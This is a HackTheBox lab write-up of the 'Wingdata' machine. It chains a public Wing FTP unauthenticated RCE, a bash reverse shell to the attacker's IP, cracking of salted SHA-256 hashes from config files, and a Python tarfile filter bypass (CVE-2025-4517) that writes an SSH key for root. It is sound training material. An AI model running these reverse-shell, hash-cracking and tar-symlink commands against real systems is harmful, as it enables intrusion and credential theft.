# Wingdata – HackTheBox Writeup

**Target:** Wingdata (10.129.244.106)
**Attacker:** Kali Linux
**OS:** Linux (Debian)
**Difficulty:** Easy
**Attack Path:** Wing FTP Unauthenticated RCE → Config File Password Hash Extraction → Salted SHA-256 Cracking → Python tarfile PATH_MAX Filter Bypass (CVE-2025-4517) → Root

---

## Recon

### Port Scan

```bash
sudo nmap -sV -sC -p- --min-rate 5000 10.129.244.106
```

Only two ports open. SSH on 22 and Apache on 80. The web server immediately redirects to `wingdata.htb` so that goes into hosts:

```bash
echo "10.129.244.106 wingdata.htb" | sudo tee -a /etc/hosts
```

65533 ports showed as **filtered** which means there's a firewall in front. This turned out to be important later because internal services like the Wing FTP admin panel on port 5466 were running but completely unreachable from the outside.

### Exploring the Website

The main site didn't have much going on. Ran gobuster but found nothing useful. The interesting thing was a "Client Portal" button on the page that linked to `ftp.wingdata.htb`. Had to add that to hosts too:

```bash
echo "10.129.244.106 ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

### Identifying Wing FTP

Opened `ftp.wingdata.htb` in the browser and there's a login page for a web-based FTP client. The footer gave everything away:

```
FTP server software powered by Wing FTP Server v7.4.3
```

Version number sitting right there in plain sight. Same as with FreePBX on Connected where the footer just tells you the version. The moment you see that, google it.

---

## Getting a Shell

### Finding the Exploit

Googled `Wing FTP Server 7.4.3 CVE exploit` and found an Unauthenticated RCE exploit on exploit-db.com. Downloaded `52347.py`. No need to spend hours poking at the login form when there's a known unauthenticated bug.

### Reverse Shell

Started a listener on Kali:

```bash
nc -lvnp 4444
```

Then used the exploit to pop a reverse shell:

```bash
python3 52347.py -u http://ftp.wingdata.htb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.106/4444 0>&1'"
```

Important detail here. The whole command has to be in quotes, otherwise zsh tries to parse the curly braces and pipes as its own syntax. `bash -c` wraps everything into a single command string that the target executes.

Shell popped. We're `wingftp`. Upgraded it immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## From wingftp to wacky

### Enumerating Wing FTP

Wing FTP stores everything under `/opt/wftpserver/`. The interesting structure:

```bash
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/steve.xml
/opt/wftpserver/Data/1/users/john.xml
/opt/wftpserver/Data/1/users/anonymous.xml
/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
```

Each XML file contains the user config including their password hash. Checked the system users first:

```bash
ls /home/
# wacky
```

So `wacky` is the target user. His hash from `wacky.xml`:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

64 hex characters, looks like SHA-256.

### The Hash Cracking Rabbit Hole

First attempt with hashcat using straight SHA-256 (mode 1400):

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca" > hash.txt
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

Nothing. Put all four user hashes in and ran them together. Still zero results across 14 million passwords. When rockyou fails on four separate hashes, it's almost never that all four people picked passwords outside the wordlist. It's the hash format that's wrong.

John the Ripper actually gave a clue early on. When I first ran it, it detected the format as `cryptoSafe [AES-256-CBC]` instead of raw SHA-256. I ignored that. Shouldn't have.

### Identifying the Correct Format

Googled `Wing FTP Server password hash format` and found that Wing FTP uses SHA-256 with a fixed salt: `WingFTP`. The format is `sha256($pass.$salt)` which is hashcat mode 1410. The salt gets appended to the password before hashing. So the hash of password `abc123` isn't `sha256("abc123")`, it's `sha256("abc123WingFTP")`.

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky.txt
hashcat -m 1410 wacky.txt /usr/share/wordlists/rockyou.txt
```

Cracked in seconds: `!#7Blushing^*Bride5`

### SSH as wacky

```bash
ssh wacky@wingdata.htb
# Password: !#7Blushing^*Bride5
```

User flag:

```bash
cat ~/user.txt
```

### Dead Ends Worth Mentioning

Before cracking the hash correctly I spent a lot of time on other paths. Tried modifying `admins.xml` to replace the admin hash with a known SHA-256 hash, but that didn't work because Wing FTP uses AES encryption for admin passwords, not SHA-256. The `wftp_default_ssh.key` file looked promising but turned out to be a TLS key for SFTP connections (`-----BEGIN PRIVATE KEY-----` instead of `-----BEGIN OPENSSH PRIVATE KEY-----`), completely useless for SSH login. Also tried disabling wacky's password in the XML by changing `EnablePassword` to 0 and logging in through the web client, but his FTP home directory was empty and mapped to nothing useful.

The firewall blocking external access to port 5466 (admin panel) made things harder too. Could reach it internally with `curl http://127.0.0.1:5466/` but couldn't use the browser-based admin interface properly through curl alone.

---

## Privilege Escalation

### sudo -l

First command after logging in. Always.

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

A Python script that runs as root, no password needed, with a wildcard for arguments.

### Understanding the Script

```bash
cat /opt/backup_clients/restore_backup_clients.py
```

The script takes a backup tar file from `/opt/backup_clients/backups/` and extracts it to a staging directory under `/opt/backup_clients/restored_backups/`. Key details:

- Backup filename must match `backup_<number>.tar`
- Restore directory must start with `restore_` followed by alphanumeric characters
- Uses `tarfile.extractall(path=staging_dir, filter="data")`
- The `backups/` directory is writable by wacky (`drwxrwx---`)

The `filter="data"` is supposed to be the secure way to extract tar files in Python 3.12+. It blocks absolute paths, `..` traversal, and symlinks that point outside the extraction directory. The idea is you can't escape the staging directory.

### First Attempts (Failed)

Tried creating a tar with a symlink pointing to `/etc/sudoers.d`:

```bash
python3 -c '
import tarfile
with tarfile.open("/opt/backup_clients/backups/backup_1001.tar", "w") as tar:
    sym = tarfile.TarInfo(name="link")
    sym.type = tarfile.SYMTYPE
    sym.linkname = "/etc/sudoers.d"
    tar.addfile(sym)
'
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_test
```

```
[!] Error during extraction: 'link' is a link to an absolute path
```

Tried a relative path with `../`:

```
[!] Error during extraction: 'link' would link to '/etc/sudoers.d', which is outside the destination
```

Tried hardlinks:

```
[!] Error during extraction: 'shadow' is a link to an absolute path
```

The `data` filter was catching everything. Every symlink, hardlink, and path traversal attempt was blocked.

### CVE-2025-4517 – The PATH_MAX Bypass

Checked the Python version:

```bash
python3 --version
# Python 3.12.3
```

Python 3.12.3 is vulnerable to CVE-2025-4517. The `data` filter uses `os.path.realpath()` to check if symlink targets stay within the extraction directory. But `os.path.realpath()` has a bug: when the resolved path exceeds `PATH_MAX` (4096 bytes on Linux), it silently stops resolving symlinks and falls back to string manipulation. The filter thinks the path is safe, but the kernel resolves the real path correctly during extraction and escapes the sandbox.

The trick is to create a tar archive with deeply nested directories (each with a ~240-character name) and short symlinks pointing to them. This builds up a chain where the cumulative path length exceeds 4096 bytes. At the end of the chain, a final symlink uses `../` sequences to escape back to the filesystem root. The filter's `realpath()` call overflows and returns a fake "safe" path, but the kernel follows the real symlinks and writes wherever you want.

Found a working PoC on GitHub tailored exactly for this scenario. It writes an SSH public key to `/root/.ssh/authorized_keys`. Generated a keypair, built the malicious tar, placed it in the backups directory, and triggered the extraction:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwned
```

The extraction completed without errors. The `data` filter saw safe-looking paths while the kernel followed the symlink chain right through to `/root/.ssh/authorized_keys`.

### Root

```bash
ssh -i /tmp/cve_2025_4517_key root@localhost
whoami
# root
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap -p- → Port 22 (SSH) + Port 80 (Apache, firewall blocking everything else)
→ Apache redirects to wingdata.htb
→ Client Portal button → ftp.wingdata.htb
→ Wing FTP Server v7.4.3 in footer
→ Google CVE → exploit-db.com → 52347.py (Unauthenticated RCE)
→ Reverse shell as wingftp
→ /opt/wftpserver/Data/1/users/*.xml → password hashes
→ hashcat mode 1400 (SHA-256) fails on all 4 hashes
→ Research → Wing FTP uses sha256($pass.$salt) with salt "WingFTP"
→ hashcat mode 1410 → wacky: !#7Blushing^*Bride5
→ SSH as wacky → user flag
→ sudo -l → restore_backup_clients.py runs as root with filter="data"
→ Python 3.12.3 → CVE-2025-4517 (PATH_MAX symlink bypass)
→ SSH key written to /root/.ssh/authorized_keys → root
```

---

## What I Learned

When hashes don't crack with rockyou, question the format before trying bigger wordlists. Four hashes all failing against 14 million passwords is a strong signal that the hashing algorithm or format is wrong. Always research how the specific software stores its passwords. Wing FTP uses `sha256($pass.$salt)` with a fixed salt of `WingFTP`, which is hashcat mode 1410 instead of 1400. The difference between the two is whether a salt is appended.

Version numbers in footers are free recon. Wing FTP had `v7.4.3` right there at the bottom of the page. Same pattern as FreePBX on Connected. The moment you see a version, google it with CVE.

Quotes around shell commands matter. When passing reverse shell commands through exploits, the whole payload needs to be in quotes so your local shell (especially zsh) doesn't try to interpret pipes, ampersands, and curly braces. Without quotes, zsh interpreted the curly braces as its own syntax and threw `parse error near '}'`.

SSL/TLS keys are not SSH keys. `-----BEGIN PRIVATE KEY-----` (PKCS#8) is for TLS/HTTPS. `-----BEGIN OPENSSH PRIVATE KEY-----` is for SSH login. Wing FTP's `wftp_default_ssh.key` was a server host key for SFTP, not a user authentication key. Don't waste time trying to `ssh -i` with TLS keys.

Python's `filter="data"` in tarfile is not bulletproof. CVE-2025-4517 proves that the safety mechanism can be bypassed entirely through a PATH_MAX overflow in `os.path.realpath()`. Python 3.12.0 through 3.12.10 are affected. When the resolved path exceeds 4096 bytes, `realpath()` stops resolving symlinks and returns a string-manipulated path that the filter wrongly considers safe. The fix landed in Python 3.12.11.

Don't get tunnel vision on one approach. I spent significant time trying to modify admin hashes, disable passwords in XML configs, and access the admin panel through curl. None of it worked. The actual path was simpler: crack the salted hash, SSH in, and exploit a known Python CVE. When something isn't working, move on and enumerate more.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
